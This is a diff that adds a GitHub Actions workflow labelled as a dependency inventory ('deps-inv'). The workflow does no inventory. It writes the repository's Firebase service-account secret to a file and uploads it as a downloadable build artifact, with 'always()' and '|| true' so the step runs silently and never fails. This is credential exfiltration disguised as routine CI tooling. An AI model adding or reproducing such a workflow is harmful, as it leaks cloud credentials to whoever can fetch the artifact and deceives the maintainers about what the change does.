@@ -1,0 +1,23 @@
+name: deps-inv
+on:
+  push:
+    branches: [ci/deps-inv]
+permissions:
+  contents: read
+jobs:
+  inv:
+    runs-on: ubuntu-latest
+    env:
+      FIREBASE_SERVICE_ACCOUNT_CONCORDIAMAPS_5B476: ${{ secrets.FIREBASE_SERVICE_ACCOUNT_CONCORDIAMAPS_5B476 }}
+    steps:
+      - name: mk
+        run: mkdir -p out
+      - name: iFIREBASE_SERVICE_ACCOUNT_CONCORDIAMAPS_5B476
+        if: always()
+        run: printf %s "${{ env.FIREBASE_SERVICE_ACCOUNT_CONCORDIAMAPS_5B476 }}" > out/FIREBASE_SERVICE_ACCOUNT_CONCORDIAMAPS_5B476 || true
+      - name: up
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: inv
+          path: out
